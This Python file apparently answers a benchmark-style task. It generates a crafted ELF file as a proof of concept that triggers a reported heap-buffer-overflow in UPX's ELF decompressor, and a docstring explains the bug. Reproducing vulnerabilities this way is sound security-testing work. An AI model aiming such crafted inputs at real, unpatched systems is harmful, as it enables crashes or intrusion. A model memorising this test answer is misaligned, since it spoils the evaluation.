import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for oss-fuzz:383200048.

        The vulnerability is a heap-buffer-overflow in the UPX ELF decompressor,
        caused by `ph.method` not being reset for each compression block (`b_info`).
        This allows the compression method from a prior block to be reused for a
        subsequent block.

        This PoC exploits this by:
        1. Crafting a 512-byte ELF file with one program header segment.
        2. This segment contains two compression blocks (`b_info` entries).
        3. Block 0 uses `M_COPY` (method 0), setting `ph.method = 0`.
        4. Block 1 is specified to use LZMA (method 8).
        5. Due to the bug, the vulnerable decompressor reuses `ph.method = 0`
           for Block 1.
        6. The `M_COPY` logic reads `b_usize` bytes from the file. We set
           `b_info[1].b_usize` to a large value (0xF00), causing a read
           past the end of the file's buffer, triggering the overflow.
        7. The fixed version correctly uses LZMA for Block 1, which fails
           gracefully on the invalid data, avoiding the crash.
        """

        poc = bytearray(512)

        # Elf64_Ehdr (64 bytes at offset 0x0)
        e_ident = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        e_type = 3          # ET_DYN
        e_machine = 62      # EM_X86_64
        e_version = 1
        e_entry = 0
        e_phoff = 0x40
        e_shoff = 0
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 1
        e_shentsize = 0
        e_shnum = 0
        e_shstrndx = 0
        
        elf_header = struct.pack(
            '<16sHHIIQQQIHHHHHH',
            e_ident, e_type, e_machine, e_version,
            e_entry, e_phoff, e_shoff, e_flags,
            e_ehsize, e_phentsize, e_phnum,
            e_shentsize, e_shnum, e_shstrndx
        )
        poc[0:len(elf_header)] = elf_header

        # Elf64_Phdr (56 bytes at offset 0x40)
        b0_csize, b0_usize = 0x100, 0x100
        b1_csize, b1_usize = 20, 0xF00

        p_type = 1
        p_flags = 6
        p_offset = 0x80
        p_vaddr = 0x400000
        p_paddr = 0
        p_filesz = b0_csize + b1_csize
        p_memsz = b0_usize + b1_usize
        p_align = 0x1000
        
        prog_header = struct.pack(
            '<IIQQQQQQ',
            p_type, p_flags, p_offset, p_vaddr,
            p_paddr, p_filesz, p_memsz, p_align
        )
        poc[0x40:0x40+len(prog_header)] = prog_header

        # UPX trailer (12 bytes at the end of the file)
        l_info_size = 32
        p_info_size = 16
        b_info_size = 16
        n_pinfo = 1
        n_binfo = 2
        
        sz_packhdr = l_info_size + (n_pinfo * p_info_size) + (n_binfo * b_info_size)
        checksum = 0
        magic = b'UPX!'
        
        trailer_offset = 512 - 12
        poc[trailer_offset:trailer_offset+4] = struct.pack('<I', sz_packhdr)
        poc[trailer_offset+4:trailer_offset+8] = struct.pack('<I', checksum)
        poc[trailer_offset+8:trailer_offset+12] = magic

        # UPX metadata block (placed before the trailer)
        metadata_offset = trailer_offset - sz_packhdr

        # l_info (32 bytes)
        l_info_data = bytearray(l_info_size)
        struct.pack_into('<II', l_info_data, 16, n_pinfo, n_binfo)
        poc[metadata_offset:metadata_offset+l_info_size] = l_info_data

        p_info_offset = metadata_offset + l_info_size
        
        # p_info[0] (16 bytes)
        p_progid = 0
        p_filesize = p_memsz
        p_blocksize = 0
        p_nblock = n_binfo
        p_info_data = struct.pack('<IIII', p_progid, p_filesize, p_blocksize, p_nblock)
        poc[p_info_offset:p_info_offset+p_info_size] = p_info_data

        b_info_offset = p_info_offset + p_info_size * n_pinfo

        # b_info[0] (16 bytes)
        b0_method = 0
        b0_off = 0x80
        b_info_0_data = struct.pack('<IIII', b0_method, b0_off, b0_csize, b0_usize)
        poc[b_info_offset:b_info_offset+b_info_size] = b_info_0_data

        # b_info[1] (16 bytes)
        b1_method = 8
        b1_off = b0_off + b0_csize
        b_info_1_data = struct.pack('<IIII', b1_method, b1_off, b1_csize, b1_usize)
        poc[b_info_offset+b_info_size:b_info_offset+2*b_info_size] = b_info_1_data

        return bytes(poc)